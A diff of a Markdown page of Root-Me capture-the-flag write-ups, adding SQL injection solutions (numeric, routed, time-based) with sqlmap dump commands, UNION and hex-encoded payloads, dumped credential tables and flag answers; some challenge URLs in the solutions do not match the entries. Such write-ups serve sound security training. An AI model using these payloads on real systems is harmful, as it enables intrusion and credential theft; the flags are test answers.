@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [34/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [39/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -55,8 +55,8 @@ These challenges are designed to train users on HTML, HTTP and other server side
 47. [NoSQL injection - Authentication](#nosql-injection-authentication)
 48. [PHP - Path Truncation](#php-path-truncation)
 49. [PHP - Serialization](#php-serialization)
-50. [SQL injection - Numeric](#sql-injection-numeric)
-51. [SQL Injection - Routed](#sql-injection-routed)
+50. [SQL injection - Numeric](#sql-injection-numeric) 🗸
+51. [SQL Injection - Routed](#sql-injection-routed) 🗸
 52. [SQL Truncation](#sql-truncation)
 53. [XML External Entity](#xml-external-entity)
 54. [XPath injection - Authentication](#xpath-injection-authentication)
@@ -3488,6 +3488,57 @@ t0_W34k!$
 
 ---
 
+## SQL injection Authentication GBK
+
+- Author: dvor4x
+- Date: 2 December 2015
+- Points: 30
+- Level: 3
+
+### Statement
+
+Get an Administrator access.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch42/).
+
+### Resources
+
+1. [Blackhat Europe 2009 - Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
+2. [NoSQL, No injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20NoSQL,%20No%20injection%20-%20Ron,%20Shulman-Peleg,%20Bronshtein.pdf).
+3. [Guide to PHP security: chapter 3 SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Guide%20to%20PHP%20security%20:%20chapter%203%20SQL%20injection.pdf).
+3. [BLackhat US 2006: SQL Injections by truncation](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20US%202006%20:%20SQL%20Injections%20by%20truncation.pdf).
+4. [Manipulating SQL server using SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Manipulating%20SQL%20server%20using%20SQL%20injection.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+iMDaFlag1337!
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
 ## SQL injection String
 
 - Author: g0uZ
@@ -3602,6 +3653,229 @@ This provides the password details in the source code of the website.
 
 ~~~
 SWRwehpkTI3Vu2F9DoTJJ0LBO
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## SQL injection Numeric
+
+- Author: g0uZ
+- Date: 24 December 2012
+- Points: 35
+- Level: 3
+
+### Statement
+
+Retrieve Administrators Password.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch34/).
+
+### Resources
+
+1. [Blackhat Europe 2009 - Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
+2. [Guide to PHP security: chapter 3 SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Guide%20to%20PHP%20security%20:%20chapter%203%20SQL%20injection.pdf).
+3. [Blackhat US 2006: SQL injections by truncation](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20US%202006%20:%20SQL%20Injections%20by%20truncation.pdf).
+4. [Manipulating SQL server using SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Manipulating%20SQL%20server%20using%20SQL%20injection.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website we find five webpages:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch18/
+http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1
+http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2
+http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=3
+http://challenge01.root-me.org/web-serveur/ch18/?action=login
+~~~
+
+Using SQLmap we can automate the injection process:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1" --batch --banner
+...
+---
+Parameter: news_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=news&news_id=1 AND 7444=7444
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: action=news&news_id=1 AND 4593=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: action=news&news_id=1 UNION ALL SELECT NULL,NULL,CHAR(113,107,122,106,113)||CHAR(86,84,82,121,76,82,67,88,108,86,86,97,120,84,87,120,103,118,99,108,85,87,70,116,102,76,85,121,119,69,108,71,78,109,85,120,113,119,69,79)||CHAR(113,107,113,106,113)-- RSfw
+---
+...
+web application technology: Nginx
+back-end DBMS: SQLite
+banner: '3.31.1'
+~~~
+
+This first batch command identifies the injection vulnerability to SQLite.  We can delve deeper into the database using the -dbs flag:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1" --batch --dbs
+...
+[19:39:50] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
+...
+~~~
+
+Let's try looking at the tables directly:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1" --batch --tables
+...
+<current>
+[2 tables]
++-------+
+| news  |
+| users |
++-------+
+...
+~~~
+
+Finally, dumping the users table we can get the user details including admin password:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1" --batch --dump -T users
+...
+Database: <current>
+Table: users
+[3 entries]
++------+-----------------+----------+
+| Year | password        | username |
++------+-----------------+----------+
+| 2006 | vUrpgAsCTX      | user1    |
+| 2005 | aTlkJYLjcbLmue3 | admin    |
+| 2008 | aFjRKx7j9d      | user2    |
++------+-----------------+----------+
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+aTlkJYLjcbLmue3
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## SQL injection Routed
+
+- Author: soka
+- Date: 24 December 2016
+- Points: 35
+- Level: 3
+
+### Statement
+
+Find the admin password.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch49/).
+
+### Resources
+
+1. [Routed SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website we find five webpages:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch49/index.php
+http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search
+~~~
+
+Usingt the search function, we find details for the admin: 
+
+~~~
+login: admin
+ID: 3
+email: admin@sqli_me.com
+~~~
+
+We can input SQL injections into this search tool.  Using the injection:
+
+~~~
+'union select 1-- --
+~~~
+
+We can find the username for the user with id 1:
+
+~~~
+[+] Requested login: 'union select 1-- --
+[+] Found ID: 1
+[+] Email: jean@sqli_me.com
+~~~
+
+Again for 2:
+
+~~~
+[+] Requested login: 'union select 2-- --
+[+] Found ID: 2
+[+] Email: michel@sqli_me.com
+~~~
+
+We now have 3 users in the database:
+
+| login  | ID | Email              |
+|--------|----|--------------------|
+| jean   | 1  | jean@sqli_me.com   |
+| michel | 2  | michel@sqli_me.com |
+| admin  | 3  | admin@sqli_me.com  |
+|--------|----|--------------------|
+
+Trying more in-depth injects, we find the input is filtered and we get the message "attack detected".  We can revert to using hex characters:
+
+~~~
+'union select ' union select 1,password from users limit 0,1
+' union select 0x2720756E696F6E2073656C65637420312C70617373776F72642066726F6D207573657273206C696D697420302C3123 -- 
+~~~
+
+This returns the admin password
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+qs89QdAs9A
 ~~~
 
 </details>
@@ -3982,6 +4256,131 @@ superpassword
 
 ---
 
-Last updated Jan 2022.
+## SQL injection Time based
+
+- Author: ycam
+- Date: 11 September 2015
+- Points: 45
+- Level: 3
+
+### Statement
+
+Retrieve Administrators Password.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch40/).
+
+### Resources
+
+1. [Time based blind SQL injection using heavy queries](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Time%20based%20blind%20SQL%20Injection%20using%20heavy%20queries.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website we find three webpages:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch34/?action=login
+http://challenge01.root-me.org/web-serveur/ch31/?action=members
+http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1
+~~~
+
+Using SQLmap we can automate the injection process:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --batch --banner
+...
+GET parameter 'member' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 114 HTTP(s) requests:
+---
+Parameter: member (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: action=member&member=1;SELECT PG_SLEEP(5)--
+---
+...
+[18:45:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[18:45:44] [INFO] adjusting time delay to 3 seconds due to good response times
+...
+~~~
+
+This first batch command identifies the time injection variable.  We can delve deeper into the database using the -dbs flag with a time-based payload:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 --dbs --no-cast
+...
+available databases [3]:
+
+[*] information_schema
+[*] pg_catalog
+[*] public
+...
+~~~
+
+We can find the current DB using --current-db flag:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 --current-db --no-cast
+...
+current schema (equivalent to database on PostgreSQL):    'public'
+...
+~~~
+
+We can interrogate the public DB:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 --no-cast -D public --tables
+...
+Database: public
+[1 table]
++-------+
+| users |
++-------+
+...
+~~~
+	
+Finally, dumping the table we can get the user details including the passwords:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 --no-cast --dump -T users -D public
+...
+Database: public
+Table: users
+[3 entries]
++----+---------------------------+----------+---------------+----------+-----------+
+| id | email                     | lastname | password      | username | firstname |
++----+---------------------------+----------+---------------+----------+-----------+
+| 1  | ycam@sqlitimebased.com    | MAC      | T!m3B@s3DSQL! | admin    | Yann      |
+| 2  | jsilver@sqlitimebased.com | SILVER   | J0hNG0lDeN    | jsilver  | John      |
+| 3  | jsparow@sqlitimebased.com | SPAROW   | Sp@r0WKr@K3n  | jsparow  | Jack      |
++----+---------------------------+----------+---------------+----------+-----------+
+~~~
+	
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+T!m3B@s3DSQL!
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+Last updated April 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
